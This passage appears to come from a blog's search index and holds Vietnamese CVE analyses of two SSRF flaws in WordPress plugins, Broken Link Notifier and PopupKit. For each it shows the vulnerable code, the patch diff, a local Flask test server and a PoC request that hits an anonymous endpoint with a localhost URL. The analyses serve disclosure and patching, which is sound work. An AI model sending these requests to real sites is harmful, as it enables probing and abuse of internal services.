gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code Trong phi√™n b·∫£n l·ªói, h√†m check_url_status_code() th·ª±c hi·ªán vi·ªác g·ªçi wp_remote_get() tr·ª±c ti·∫øp v·ªõi URL do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng h·ªÅ ki·ªÉm tra t√≠nh h·ª£p l·ªá hay m·ª©c ƒë·ªô an to√†n c·ªßa URL. ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng SSRF (Server-Side Request Forgery). Phi√™n b·∫£n n√†y kh√¥ng ki·ªÉm tra scheme c·ªßa URL, host c√≥ h·ª£p l·ªá hay kh√¥ng, hay IP c√≥ thu·ªôc d·∫£i private/reserved, n√™n m·ªçi request ƒë·ªÅu ƒë∆∞·ª£c th·ª±c hi·ªán m√† kh√¥ng c√≥ h·∫°n ch·∫ø. public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Block SSRF to private/reserved ranges $unsafe = $this-\u003eis_url_unsafe( $link ); if ( $unsafe ) { return apply_filters( 'blnotifier_status', $unsafe ); } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code protected function is_url_unsafe( $url ) { $parts = wp_parse_url( $url ); if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: invalid or malformed URL', 'link' =\u003e $url ]; } $scheme = strtolower( $parts[ 'scheme' ] ); if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: unsupported URL scheme', 'link' =\u003e $url ]; } $host = $parts[ 'host' ]; $records = @dns_get_record( $host, DNS_A + DNS_AAAA ); $ips = []; if ( is_array( $records ) \u0026\u0026 count( $records ) ) { foreach ( $records as $record ) { if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'A' \u0026\u0026 ! empty( $record[ 'ip' ] ) ) { $ips[] = $record[ 'ip' ]; } if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'AAAA' \u0026\u0026 ! empty( $record[ 'ipv6' ] ) ) { $ips[] = $record[ 'ipv6' ]; } } } else { $resolved = gethostbyname( $host ); if ( $resolved \u0026\u0026 $resolved !== $host ) { $ips[] = $resolved; } } if ( empty( $ips ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: host could not be resolved', 'link' =\u003e $url ]; } foreach ( $ips as $ip ) { if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: resolved to internal or reserved IP address', 'link' =\u003e $url ]; } } return false; // Safe } // End is_url_unsafe() B·∫£n v√° ƒë√£ b·ªï sung h√†m is_url_unsafe(). Tr∆∞·ªõc khi g·ªçi wp_remote_get(), URL ƒë∆∞·ª£c ki·ªÉm tra chi ti·∫øt: ch·ªâ cho ph√©p scheme http v√† https, x√°c th·ª±c host h·ª£p l·ªá, th·ª±c hi·ªán resolve DNS ƒë·ªÉ l·∫•y IP v√† ch·∫∑n t·∫•t c·∫£ c√°c IP n·ªôi b·ªô ho·∫∑c thu·ªôc d·∫£i reserved. N·∫øu URL kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng an to√†n, h√†m s·∫Ω tr·∫£ v·ªÅ th√¥ng tin chi ti·∫øt v·ªÅ vi·ªác block v√† kh√¥ng th·ª±c hi·ªán request, t·ª´ ƒë√≥ ngƒÉn ch·∫∑n SSRF hi·ªáu qu·∫£. B·∫£n v√° ƒë·∫£m b·∫£o r·∫±ng ch·ªâ c√°c URL an to√†n m·ªõi ƒë∆∞·ª£c ph√©p g·ªçi, gi·∫£m thi·ªÉu r·ªßi ro t·∫•n c√¥ng t·ª´ b√™n ngo√†i. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic function check_url_status_code( $url, $timeout = null ) { // Get the 'allow_redirects' option and sanitize it $allow_redirects = filter_var( get_option( 'blnotifier_allow_redirects' ), FILTER_VALIDATE_BOOLEAN ); // Determine the request method based on allow_redirects option $request_method = $allow_redirects ? 'GET' : 'HEAD'; // Force giving head for images, videos, and audio files if ( $request_method == 'GET' ) { $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) ); if ( in_array( $file_extension, $this-\u003eget_force_head_file_types() ) ) { $request_method = 'HEAD'; } } // User agent $user_agent = $this-\u003eget_user_agent( $url ); // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Check if from youtube if ( $watch_url = $this-\u003eis_youtube_link( $link ) ) { $link = 'https://www.youtube.com/oembed?format=json\u0026url='.$watch_url; } // The request args // See https://developer.wordpress.org/reference/classes/WP_Http/request/ $http_request_args = apply_filters( 'blnotifier_http_request_args', [ 'method' =\u003e $request_method, 'timeout' =\u003e $timeout, 'redirection' =\u003e absint( get_option( 'blnotifier_max_redirects', 5 ) ), 'httpversion' =\u003e '1.1', 'sslverify' =\u003e filter_var( get_option( 'blnotifier_ssl_verify', true ), FILTER_VALIDATE_BOOLEAN ), 'user-agent' =\u003e $user_agent ], $url ); // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } // Let's make invalid URL 0 codes broken if ( $code === 0 \u0026\u0026 ( $error == 'A valid URL was not provided.' || strpos( $error, 'cURL error 6: Could not resolve host' ) !== false ) ) { $code = 666; } // Possible Codes $codes = $this-\u003eget_status_codes(); // Files too large if ( $request_method == 'GET' ) { $content_length = wp_remote_retrieve_header( $response, 'content-length' ); if ( $content_length \u0026\u0026 $content_length \u003e 10 * 1024 * 1024 ) { // 10 MB $code = 413; } } // Bad links if ( in_array( $code, $this-\u003eget_bad_status_codes() ) ) { $type = 'broken'; // Warnings } elseif ( in_array( $code, $this-\u003eget_warning_status_codes() ) ) { $type = 'warning'; // Good links } else { $type = 'good'; } // Filter status $status = apply_filters( 'blnotifier_status', [ 'type' =\u003e $type, 'code' =\u003e $code, 'text' =\u003e ( $code !== 0 \u0026\u0026 ( isset( $codes[ $code ] ) \u0026\u0026 $codes[ $code ][ 'msg' ] != '' ) ) ? $codes[ $code ][ 'msg' ] : $error, 'link' =\u003e $url ] ); // Return the array return $status; } // End check_url_status_code H√†m check_url_status_code() c√≥ nhi·ªám v·ª• ki·ªÉm tra tr·∫°ng th√°i c·ªßa m·ªôt URL v√† ph√¢n lo·∫°i n√≥ l√† good (t·ªët), warning (c·∫£nh b√°o) ho·∫∑c broken (h·ªèng). C·ª• th·ªÉ, ho·∫°t ƒë·ªông c·ªßa h√†m g·ªìm c√°c b∆∞·ªõc ch√≠nh: L·∫•y t√πy ch·ªçn c·∫•u h√¨nh L·∫•y t√πy ch·ªçn blnotifier_allow_redirects t·ª´ database v√† chuy·ªÉn v·ªÅ boolean ‚Üí Quy·∫øt ƒë·ªãnh xem request s·∫Ω d√πng GET hay HEAD. Ch·ªçn ph∆∞∆°ng th·ª©c request N·∫øu allow_redirects = true, m·∫∑c ƒë·ªãnh d√πng GET. N·∫øu URL l√† file media (h√¨nh ·∫£nh, video, audio), h√†m s·∫Ω √©p d√πng HEAD ƒë·ªÉ tr√°nh t·∫£i to√†n b·ªô file l·ªõn. Ghi ch√∫\rT√πy ch·ªçn n√†y ƒë∆∞·ª£c thi·∫øt l·∫≠p t·∫°i http://localhost/wp-admin/admin.php?page=broken-link-notifier\u0026tab=settings Allow Redirect settings\rX√°c ƒë·ªãnh user-agent H√†m g·ªçi $this-\u003eget_user_agent() ƒë·ªÉ l·∫•y user-agent ph√π h·ª£p cho request. Chu·∫©n h√≥a URL N·∫øu URL b·∫Øt ƒë·∫ßu b·∫±ng / ‚Üí n·ªëi v·ªõi home_url() ƒë·ªÉ th√†nh URL tuy·ªát ƒë·ªëi. N·∫øu URL l√† link YouTube, chuy·ªÉn sang endpoint oembed ƒë·ªÉ l·∫•y th√¥ng tin an to√†n m√† kh√¥ng c·∫ßn truy c·∫≠p tr·ª±c ti·∫øp video. C·∫•u h√¨nh request: X√¢y d·ª±ng m·∫£ng $http_request_args ch·ª©a c√°c th√¥ng s·ªë cho request: method (GET/HEAD) timeout redirection (s·ªë l·∫ßn redirect t·ªëi ƒëa) sslverify (c√≥ ki·ªÉm tra SSL hay kh√¥ng) user-agent Th·ª±c hi·ªán request G·ªçi wp_remote_get($link, $http_request_args) ƒë·ªÉ l·∫•y response. N·∫øu kh√¥ng l·ªói ‚Üí l·∫•y status code t·ª´ server. N·∫øu l·ªói ‚Üí l·∫•y th√¥ng b√°o l·ªói. X·ª≠ l√Ω c√°c URL kh√¥ng h·ª£p l·ªá M·ªôt s·ªë l·ªói c∆° b·∫£n nh∆∞ kh√¥ng cung c·∫•p URL h·ª£p l·ªá ho·∫∑c k","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph LR\rA[Anonymous Client g·ª≠i URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get v·ªõi URL user cung c·∫•p]\rE --\u003e F[Response t·ª´ server]\rgraph LR\rA[Anonymous Client g·ª≠i URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get v·ªõi URL user cung c·∫•p]\rE --\u003e F[Response t·ª´ server]\rgraph LR\rA[Anonymous Client g·ª≠i URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get v·ªõi URL user cung c·∫•p]\rE --\u003e F[Response t·ª´ server]\rgraph LR\rA[Anonymous Client g·ª≠i URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get v·ªõi URL user cung c·∫•p]\rE --\u003e F[Response t·ª´ server]\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, request import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rTruy c·∫≠p trang ch·ªß v√† l·∫•y nonce G·ª≠i POST request ƒë·∫øn endpoint POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=blnotifier_blinks\u0026nonce=87f4d1ef16\u0026source_url=http://localhost:8001/\u0026header_links[0]=http://127.0.0.1:8001/delete?id=1 Result: G·ª≠i th√†nh c√¥ng request t·ªõi local service\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§1.3.0 c·ªßa Broken Link Notifier c√≥ l·ªó h·ªïng SSRF: endpoint cho ph√©p anonymous truy·ªÅn URL, d·∫´n ƒë·∫øn wp_remote_get() g·ªçi t·ªõi d·ªãch v·ª• n·ªôi b·ªô. B·∫£n 1.3.1 ƒë√£ th√™m ki·ªÉm tra DNS/IP v√† gi·ªõi h·∫°n quy·ªÅn, ngƒÉn ch·∫∑n SSRF tr∆∞·ªõc khi th·ª±c hi·ªán request. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rN√¢ng c·∫•p ngay l√™n ‚â•1.3.1. Kh√¥ng tin URL t·ª´ client ‚Äî validate/allowlist tr∆∞·ªõc khi fetch. Ch·∫∑n IP n·ªôi b·ªô (resolve DNS, block private/reserved). Gi·ªõi h·∫°n quy·ªÅn endpoint (kh√¥ng cho anonymous). Tr·∫£ status thay v√¨ body th√¥ khi kh√¥ng c·∫ßn n·ªôi dung. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Broken Link Notifier Plugin \u003c= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers cho WordPress t·ªìn t·∫°i l·ªó h·ªïng Server-Side Request Forgery (SSRF) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ ƒë·∫ßu ƒë·∫øn 2.1.4 (bao g·ªìm c·∫£ 2.1.4). Nguy√™n nh√¢n l√† do thi·∫øu ki·ªÉm tra h·ª£p l·ªá (insufficient validation) ƒë·ªëi v·ªõi c√°c URL ƒë∆∞·ª£c truy·ªÅn th√¥ng qua tham s·ªë URL. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c (unauthenticated attackers) g·ª≠i c√°c web request ƒë·∫øn ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web, c√≥ th·ªÉ ƒë∆∞·ª£c l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n ho·∫∑c ch·ªânh s·ª≠a th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô (internal services), c≈©ng nh∆∞ th·ª±c hi·ªán ho·∫°t ƒë·ªông trinh s√°t m·∫°ng (network reconnaissance). L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° m·ªôt ph·∫ßn (partially patched) trong phi√™n b·∫£n 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) v√† 2.1.5 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rV√¨ 1 ph·∫ßn m√£ ngu·ªìn ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n 2.1.4 n√™n ta s·∫Ω s·ª≠ d·ª•ng phi√™n b·∫£n 2.1.3 ƒë·ªÉ ph√¢n t√≠ch. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong phi√™n b·∫£n 2.1.3, plugin ƒë·ªãnh nghƒ©a m·ªôt API v·ªõi POST method c√≥ permission_callback =\u003e __return_true, cho ph√©p m·ªçi ng∆∞·ªùi d√πng, bao g·ªìm c·∫£ anonymous user, th·ª±c thi h√†m fetch_external_content() v·ªõi tham s·ªë url b·∫Øt bu·ªôc. H√†m n√†y s·ª≠ d·ª•ng wp_remote_get ƒë·ªÉ g·ª≠i request ƒë·∫øn URL ƒë∆∞·ª£c truy·ªÅn v√†o v√† tr·∫£ l·∫°i n·ªôi dung ph·∫£n h·ªìi (response body). Do kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c l·ªçc URL n·ªôi b·ªô n√†o, ƒëi·ªÅu n√†y khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i request ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô (internal services) d·∫´n ƒë·∫øn l·ªó h·ªïng Server-Side Request Forgery (SSRF) c√≥ th·ªÉ khai th√°c b·ªüi anonymous user. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong b·∫£n v√° 2.1.5, plugin ƒë√£ th·ª±c hi·ªán m·ªôt s·ªë thay ƒë·ªïi nh·∫±m gi·∫£m thi·ªÉu nguy c∆° Server-Side Request Forgery (SSRF): ƒê·ªïi endpoint t·ª´ /live-preview sang /live-preview-template. Thay th·∫ø h√†m wp_remote_get() b·∫±ng wp_safe_remote_get(), gi√∫p WordPress t·ª± ƒë·ªông ch·∫∑n c√°c request ƒë·∫øn ƒë·ªãa ch·ªâ n·ªôi b·ªô nh∆∞ localhost, 127.0.0.1, ho·∫∑c 169.254.*. Nh·ªù v·∫≠y, c√°c y√™u c·∫ßu t·ª´ ng∆∞·ªùi d√πng ƒë·∫øn t√†i nguy√™n n·ªôi b·ªô c·ªßa m√°y ch·ªß s·∫Ω b·ªã ch·∫∑n, ngƒÉn ch·∫∑n kh·∫£ nƒÉng khai th√°c SSRF. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rH√†m get_routes() ƒë∆∞·ª£c g·ªçi b√™n trong register_routes(): protected $namespace = 'pbb/v1'; public function register_routes() { $routes = $this-\u003eget_routes(); foreach ($routes as $route) { register_rest_route( $this-\u003enamespace, $route['endpoint'], [ 'methods' =\u003e $route['methods'], 'callback' =\u003e [$this, $route['callback']], 'permission_callback' =\u003e isset($route['permission_callback']) ? $route['permission_callback'] : [$this, 'permission_callback'], ] ); } } public function permission_callback(): bool { return current_user_can('manage_options'); } Khi register_routes() ƒë∆∞·ª£c th·ª±c thi, t·∫•t c·∫£ c√°c route ƒë∆∞·ª£c tr·∫£ v·ªÅ t·ª´ get_routes() s·∫Ω ƒë∆∞·ª£c ƒëƒÉng k√Ω v√†o WordPress REST API th√¥ng qua h√†m register_rest_route(). ·ªû ƒë√¢y: M·ªói route s·∫Ω √°nh x·∫° t·ªõi m·ªôt endpoint, method v√† callback t∆∞∆°ng ·ª©ng. N·∫øu route kh√¥ng c√≥ kh√≥a permission_callback, plugin s·∫Ω t·ª± ƒë·ªông g√°n m·∫∑c ƒë·ªãnh l√† $this-\u003epermission_callback, y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i c√≥ quy·ªÅn manage_options (th∆∞·ªùng ch·ªâ c√≥ admin). Tuy nhi√™n, trong phi√™n b·∫£n 2.1.3, route /live-preview l·∫°i ƒë∆∞·ª£c khai b√°o th·ªß c√¥ng v·ªõi permission_callback =\u003e '__return_true', nghƒ©a l√† b·ªè qua c∆° ch·∫ø ki·ªÉm tra quy·ªÅn ·ªü tr√™n, d·∫´n ƒë·∫øn vi·ªác b·∫•t k·ª≥ ai (k·ªÉ c·∫£ anonymous user) c≈©ng c√≥ th·ªÉ g·ªçi API n√†y. Khi g·ª≠i y√™u c·∫ßu POST ƒë·∫øn endpoint /wp-json/pbb/v1/live-preview, h√†m fetch_external_content() s·∫Ω ƒë∆∞·ª£c th·ª±c thi. H√†m n√†y nh·∫≠n gi√° tr·ªã url t·ª´ tham s·ªë y√™u c·∫ßu, th·ª±c hi·ªán fetch request t·ªõi ƒë·ªãa ch·ªâ ƒë√≥ v√† tr·∫£ v·ªÅ body c·ªßa ph·∫£n h·ªìi. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i POST request ƒë·∫øn endpoint POST /wp-json/pbb/v1/live-preview HTTP/1.1 Host: localhost ... url=http://localhost:8001/metadata Result: N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service\r","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 2.1.4 c·ªßa PopupKit c√≥ l·ªó h·ªïng SSRF: endpoint /wp-json/pbb/v1/live-preview cho ph√©p anonymous g·ªçi fetch_external_content() v·ªõi tham s·ªë url t·ª´ client; h√†m n√†y d√πng wp_remote_get() v√† tr·∫£ v·ªÅ tr·ª±c ti·∫øp ph·∫ßn body, do ƒë√≥ c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n c√°c d·ªãch v·ª• n·ªôi b·ªô. B·∫£n 2.1.5 ƒë√£ chuy·ªÉn sang wp_safe_remote_get() v√† gi·ªõi h·∫°n quy·ªÅn truy c·∫≠p (ch·ªâ admin), gi√∫p gi·∫£m r·ªßi ro. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rC·∫≠p nh·∫≠t l√™n 2.1.5+. Kh√¥ng tin URL client ‚Äî x√°c th·ª±c/allowlist tr∆∞·ªõc khi fetch. D√πng wp_safe_remote_get() v√† ki·ªÉm tra th√™m (redirects, DNS). Kh√¥ng d√πng permission_callback =\u003e __return_true; gi·ªõi h·∫°n quy·ªÅn. Kh√¥ng tr·∫£ nguy√™n body th√¥ n·∫øu kh√¥ng c·∫ßn thi·∫øt. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress PopupKit Plugin \u003c= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Spectra 